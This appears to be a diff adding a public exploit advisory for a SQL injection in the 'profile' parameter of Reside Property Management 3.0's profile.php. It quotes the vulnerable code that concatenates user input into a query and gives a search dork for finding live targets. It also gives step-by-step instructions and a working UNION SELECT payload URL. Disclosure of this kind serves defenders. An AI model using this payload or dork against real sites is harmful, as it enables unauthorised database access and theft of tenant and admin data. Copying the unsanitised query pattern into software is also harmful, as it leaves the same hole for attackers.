@@ -1,0 +1,33 @@
+# Exploit Title: Reside Property Management 3.0 - 'profile' SQL Injection
+# Date: 2020-06-28
+# Google Dork: "Copyright 2020 Reside Property Management"
+# Exploit Author: Ultra Security Team (Ashkan Moghaddas , AmirMohammad Safari)
+# Team Members: Behzad Khalifeh , Milad Ranjbar
+# Vendor Homepage: https://www.13plugins.com/product/reside-v3-rental-property-management-php-script/
+# Version: v3.0 [Final Version]
+# Tested on: Windows/Linux
+# CVE: N/A
+
+.:: Description ::.
+RESIDE makes it easy to manage all of your tenants & properties, record payments, and keep everything accessible any time, from any computer or device.
+
+
+.:: Vulnerable File ::.
+profile.php
+
+
+.:: Vulnerable Code ::.
+- Line 21: $profile = $_GET['profile'];
+- Line 22: $adminsName = preg_replace('/-/', ' ', $profile);
+- Line 90: $sql = "SELECT * FROM admins WHERE adminName = '" . $adminsName . "'";
+- Line 91: mysqli_query $result = mysqli_query($mysqli, $sql) or die ('-1' . mysqli_error());
+
+
+.:: Proof Of Concept (PoC) ::.
+Step 1 - Find Your Target With the above Dork.
+Step 2 - Find profile.php File in Target
+Step 3 - Inject Your Payloads in profile parameter
+
+
+.:: Sample Request ::.
+localhost/reside-rental-property-management/Reside/profile.php?profile=-21%27+UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,user(),11,12,13,14,15,16,17,18,19,20,21,22,user(),24,25,26%23
